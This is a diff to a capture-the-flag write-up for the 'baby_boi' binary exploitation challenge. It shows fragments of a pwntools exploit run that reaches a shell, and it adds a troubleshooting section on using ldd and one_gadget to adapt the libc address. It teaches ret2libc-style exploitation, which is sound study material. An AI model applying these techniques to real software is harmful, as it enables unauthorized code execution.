@@ -68,6 +68,7 @@ So leveraging the libc infoleak with the `printf` statement to the libc `printf`
 ## Exploit
 
 Putting it all together, we have the following exploit. This was ran on `Ubuntu 18.04`:
+
 ```
 from pwn import *
 
@@ -100,6 +101,7 @@ target.interactive()
 ```
 
 When we run the exploit:
+
 ```
 $    python exploit.py
 [+] Starting local process './baby_boi': pid 12693
@@ -120,3 +122,27 @@ guyinatu :0       :0               16Sep19 ?xdm?  47.39s  0.00s /usr/lib/gdm3/gd
 $ ls
 baby_boi  baby_boi.c  exploit.py  libc-2.27.so    readme.md
 ```
+
+## Are you getting a Segmentation fault?
+
+Your system might not be compatible with the provided `libc` version, but you can still craft your own exploit for your `libc` version.
+
+1. Figure out your `libc` path:
+
+```bash
+$ ldd ./baby_boi
+
+  linux-vdso.so.1 =>  (0x00007fff3e1f3000)
+  libc.so.6 => /lib/libc.so.6 (0x00007f621f162000)
+  /lib64/ld-linux-x86-64.so.2 (0x00007f621f504000)
+```
+
+We can see that our `libc` sits in `/lib/libc.so.6`
+
+2. Now we can find the `one_gadget` for your `libc` version:
+
+```bash
+$ one_gadget /lib/libc.so.6
+```
+
+3. Finally replace the exploit with your `libc` path and the new adress found through the `one_gadget`.
